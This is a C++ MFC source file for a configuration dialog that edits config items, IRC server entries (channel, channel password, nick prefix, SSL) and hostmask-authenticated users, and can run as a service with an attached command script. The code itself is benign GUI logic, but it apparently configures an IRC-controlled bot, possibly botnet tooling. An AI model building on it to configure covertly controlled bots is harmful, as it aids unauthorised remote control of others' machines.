			uItem.sUserName=szUserName; uItem.sPassword=szPassword;
			uItem.sHostmask=szHostmask; uItem.sIdentdmask=szIdentdmask;

			m_lUserItems.push_back(uItem);

			list<user_item>::iterator iu;
			for(iu=m_lUserItems.begin(); iu!=m_lUserItems.end(); iu++) {
				if((*iu)==uItem) {
					CString sItemText;
					sItemText.Format("%s - %s - %s", (*iu).sUserName, (*iu).sIdentdmask, (*iu).sIdentdmask);
					int iItem=m_cUserList.InsertString(0, sItemText);
					m_cUserList.SetItemDataPtr(iItem, &(*iu));
					m_cUserList.SetCurSel(iItem);
					OnSelchangeUserList();
					break;
				}
			}
		} else if(!strcmp(szItemType, "script")) {
			// Read in script, must be on end of cfg
			// Break when finished
			char szReadBuf2[4096]; m_sScript="";
			while(fgets(szReadBuf2, sizeof(szReadBuf2), fp) && !feof(fp)) {
				m_sScript+=szReadBuf2;
			}
			break;
		}
	}

	fclose(fp);

	OnSelchangeConfigList(); }

void CConfigguiDlg::OnOK() {
	WriteConfigCpp(); CDialog::OnOK(); }

void CConfigguiDlg::OnLoadfrom() {
	CFileDialog dlg(TRUE, ".cfg", NULL, OFN_EXPLORER|OFN_ENABLESIZING|OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST,
		"Config File (*.cfg)|*.cfg|All Files (*.*)|*.*||", this);
	if(dlg.DoModal()==IDCANCEL) { MessageBox("No file selected!", "Error", MB_OK | MB_ICONERROR); return; }
	CString sFileName=dlg.GetPathName();
	LoadConfig(sFileName); }

void CConfigguiDlg::OnSaveto() {
	CFileDialog dlg(FALSE, ".cfg", NULL, OFN_EXPLORER|OFN_ENABLESIZING|OFN_PATHMUSTEXIST|OFN_CREATEPROMPT|OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT,
		"Config File (*.cfg)|*.cfg|All Files (*.*)|*.*||", this);
	if(dlg.DoModal()==IDCANCEL) { MessageBox("No file selected!", "Error", MB_OK | MB_ICONERROR); return; }
	CString sFileName=dlg.GetPathName();
	SaveConfig(sFileName); }

int CConfigguiDlg::DoModal() 
{
	ParseConfigDef();
	
	return CDialog::DoModal();
}

void CConfigguiDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	init_random();
	for(int i=0;szQuotes[i]!=NULL;i++);
	int iQuote=brandom(0, i-1);
	char *szSelQuote=szQuotes[iQuote];
	m_cQuote.SetWindowText(szSelQuote);

	list<config_item>::iterator ic;
	for(ic=m_lConfigItems.begin(); ic!=m_lConfigItems.end(); ic++) {
		CString sItemText;
		sItemText.Format("%s - %s", (*ic).sItemName, (*ic).sItemTypeName);
		int iItem=m_cConfigList.InsertString(0, sItemText);
		m_cConfigList.SetItemDataPtr(iItem, &(*ic));
	}
}

void CConfigguiDlg::OnSelchangeConfigList() 
{
	UpdateData(TRUE);

	int iSelected=m_cConfigList.GetCurSel();
	if(iSelected==-1) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	config_item *pItem=(config_item*)m_cConfigList.GetItemDataPtr(iSelected);
	if(!pItem) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	switch(pItem->iItemType) {
	case ITEM_TYPE_STRING:
		{	m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
			m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_SHOW);
			m_sValueString=pItem->sItemData; }
		break;
	case ITEM_TYPE_CHAR:
		{	m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_SHOW);
			m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
			char szCharStr[3]={pItem->cItemData, '\x00'};
			m_sValueChar=szCharStr; }
		break;
	case ITEM_TYPE_BOOL:
		{	m_cValueBool.ShowWindow(SW_SHOW); m_cValueChar.ShowWindow(SW_HIDE);
			m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
			m_bValueBool=pItem->bItemData; }
		break;
	case ITEM_TYPE_INT:
		{	m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
			m_cValueInt.ShowWindow(SW_SHOW); m_cValueString.ShowWindow(SW_HIDE);
			m_iValueInt=pItem->iItemData; }
		break;
	default:
		{	m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
			m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE); }
		break;
	};

	m_sDescription=pItem->sItemDesc;

	UpdateData(FALSE);
}

void CConfigguiDlg::OnValueBool() {
	UpdateData(TRUE);

	int iSelected=m_cConfigList.GetCurSel();
	if(iSelected==-1) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	config_item *pItem=(config_item*)m_cConfigList.GetItemDataPtr(iSelected);
	if(!pItem) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	if(!m_bValueBool) pItem->bItemData=false; else pItem->bItemData=true;

	if(!pItem->sItemName.Compare("as_service") && pItem->bItemData==true) {
		MessageBox("DONT DO THIS, I WARNED YOU!!!", "Warning", MB_OK);
	}

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeValueChar() {
	UpdateData(TRUE);

	int iSelected=m_cConfigList.GetCurSel();
	if(iSelected==-1) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	config_item *pItem=(config_item*)m_cConfigList.GetItemDataPtr(iSelected);
	if(!pItem) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	if(!m_sValueChar.GetLength())
		pItem->cItemData=NULL;
	else
		pItem->cItemData=m_sValueChar[0];

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeValueInt() {
	UpdateData(TRUE);

	int iSelected=m_cConfigList.GetCurSel();
	if(iSelected==-1) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	config_item *pItem=(config_item*)m_cConfigList.GetItemDataPtr(iSelected);
	if(!pItem) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	pItem->iItemData=m_iValueInt;

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeValueString() {
	UpdateData(TRUE);

	int iSelected=m_cConfigList.GetCurSel();
	if(iSelected==-1) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	config_item *pItem=(config_item*)m_cConfigList.GetItemDataPtr(iSelected);
	if(!pItem) {
		m_cValueBool.ShowWindow(SW_HIDE); m_cValueChar.ShowWindow(SW_HIDE);
		m_cValueInt.ShowWindow(SW_HIDE); m_cValueString.ShowWindow(SW_HIDE);
		return; }

	pItem->sItemData=m_sValueString;

	UpdateData(FALSE);
}

// Server list code

void CConfigguiDlg::UpdateServerList(int iIndex, server_item *pItem) {
	m_cServerList.DeleteString(iIndex);
	CString sItemText;
	sItemText.Format("%s:%d - %s - %s", pItem->sServer, pItem->iPort, pItem->sMainChan, pItem->sNickPrefix);
	int iItem=m_cServerList.InsertString(0, sItemText);
	m_cServerList.SetItemDataPtr(iItem, pItem);
	m_cServerList.SetCurSel(iItem);
}

void CConfigguiDlg::OnAddserver() {
	list<server_item>::iterator is;
	for(is=m_lServerItems.begin(); is!=m_lServerItems.end(); is++)
		if((*is).sServer=="New") return;

	server_item sItem; sItem.bRootServer=false;
	sItem.bUseSSL=false; sItem.iPort=1; sItem.sChanPass="";
	sItem.sMainChan=""; sItem.sNickPrefix="";
	sItem.sServer="New"; sItem.sServPass="";

	m_lServerItems.push_back(sItem);

	for(is=m_lServerItems.begin(); is!=m_lServerItems.end(); is++) {
		if((*is)==sItem) {
			CString sItemText;
			sItemText.Format("%s:%d - %s - %s", (*is).sServer, (*is).iPort, (*is).sMainChan, (*is).sNickPrefix);
			int iItem=m_cServerList.InsertString(0, sItemText);
			m_cServerList.SetItemDataPtr(iItem, &(*is));
			m_cServerList.SetCurSel(iItem);
			OnSelchangeServerList();
			break;
		}
	}
}

void CConfigguiDlg::OnDelserver() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	server_item tempitem=*pItem;
	m_lServerItems.remove(tempitem);
	m_cServerList.DeleteString(iSelected);

	OnSelchangeServerList();

	UpdateData(FALSE);
}

void CConfigguiDlg::OnSelchangeServerList() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) {
		m_bUseSSL=false; m_iServPort=1; m_sServPass=""; m_sServer=""; m_bRootServer=false;
		m_sNickPrefix=""; m_sMainChan=""; m_sChanPass="";
		return; }

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	m_bUseSSL=pItem->bUseSSL; m_iServPort=pItem->iPort;
	m_sServPass=pItem->sServPass; m_sServer=pItem->sServer;
	m_bRootServer=pItem->bRootServer; m_sNickPrefix=pItem->sNickPrefix;
	m_sMainChan=pItem->sMainChan; m_sChanPass=pItem->sChanPass;

	UpdateData(FALSE);
}

void CConfigguiDlg::OnUsessl() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	if(m_bUseSSL) pItem->bUseSSL=true; else pItem->bUseSSL=false;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeServport() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->iPort=m_iServPort;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeServpass() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sServPass=m_sServPass;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeServer() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sServer=m_sServer;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnRootserver() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	if(m_bRootServer) pItem->bRootServer=true; else pItem->bRootServer=false;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeNickprefix() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sNickPrefix=m_sNickPrefix;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeMainchan() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sMainChan=m_sMainChan;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeChanpass() {
	UpdateData(TRUE);

	int iSelected=m_cServerList.GetCurSel();
	if(iSelected==-1) return;

	server_item *pItem=(server_item*)m_cServerList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sChanPass=m_sChanPass;

	UpdateServerList(iSelected, pItem);

	UpdateData(FALSE);
}

// User list code

void CConfigguiDlg::UpdateUserList(int iIndex, user_item *pItem) {
	m_cUserList.DeleteString(iIndex);
	CString sItemText;
	sItemText.Format("%s - %s - %s", pItem->sUserName, pItem->sHostmask, pItem->sIdentdmask);
	int iItem=m_cUserList.InsertString(0, sItemText);
	m_cUserList.SetItemDataPtr(iItem, pItem);
	m_cUserList.SetCurSel(iItem);
}

void CConfigguiDlg::OnAdduser() {
	list<user_item>::iterator iu;
	for(iu=m_lUserItems.begin(); iu!=m_lUserItems.end(); iu++)
		if((*iu).sUserName=="New") return;

	user_item sItem; sItem.sHostmask="";
	sItem.sIdentdmask=""; sItem.sPassword="";
	sItem.sUserName="New";

	m_lUserItems.push_back(sItem);

	for(iu=m_lUserItems.begin(); iu!=m_lUserItems.end(); iu++) {
		if((*iu)==sItem) {
			CString sItemText;
			sItemText.Format("%s - %s - %s", (*iu).sUserName, (*iu).sIdentdmask, (*iu).sIdentdmask);
			int iItem=m_cUserList.InsertString(0, sItemText);
			m_cUserList.SetItemDataPtr(iItem, &(*iu));
			m_cUserList.SetCurSel(iItem);
			OnSelchangeUserList();
			break;
		}
	}
}

void CConfigguiDlg::OnDeluser() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) return;

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	user_item tempitem=*pItem;
	m_lUserItems.remove(tempitem);
	m_cUserList.DeleteString(iSelected);

	OnSelchangeUserList();

	UpdateData(FALSE);
}

void CConfigguiDlg::OnSelchangeUserList() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) {
		m_sUserName=""; m_sPassword=""; m_sIdentdmask=""; m_sHostmask="";
		return; }

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	m_sUserName=pItem->sUserName; m_sPassword=pItem->sPassword;
	m_sIdentdmask=pItem->sIdentdmask; m_sHostmask=pItem->sHostmask;

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeUsername() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) return;

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sUserName=m_sUserName;

	UpdateUserList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangePassword() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) return;

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sPassword=m_sPassword;

	UpdateUserList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeIdentdmask() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) return;

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sIdentdmask=m_sIdentdmask;

	UpdateUserList(iSelected, pItem);

	UpdateData(FALSE);
}

void CConfigguiDlg::OnChangeHostmask() {
	UpdateData(TRUE);

	int iSelected=m_cUserList.GetCurSel();
	if(iSelected==-1) return;

	user_item *pItem=(user_item*)m_cUserList.GetItemDataPtr(iSelected);
	if(!pItem) return;

	pItem->sHostmask=m_sHostmask;

	UpdateUserList(iSelected, pItem);

	UpdateData(FALSE);
}



void CConfigguiDlg::OnChangeKeyLen() 
{
	UpdateData(TRUE);
}

//DWORD WINAPI EditScriptFileThread(void *pParams) {

void CConfigguiDlg::OnEditscr() 
{
	if(g_bEditing) return; g_bEditing=true;
	
	scriptfile *psfile=new scriptfile;
	psfile->sRetVal=&m_sScript; psfile->sScript=m_sScript;

	CreateThread(NULL, 0, &EditScriptFileThread, (void*)psfile, 0, NULL);
}

void CConfigguiDlg::OnCmdref() 
{
	ShellExecute(0, "open", "doc\\!New\\Command Reference.htm", "", NULL, SW_SHOW);
}

void CConfigguiDlg::OnFaq() 
{
	ShellExecute(0, "open", "doc\\!New\\FAQ.htm", "", NULL, SW_SHOW);
}
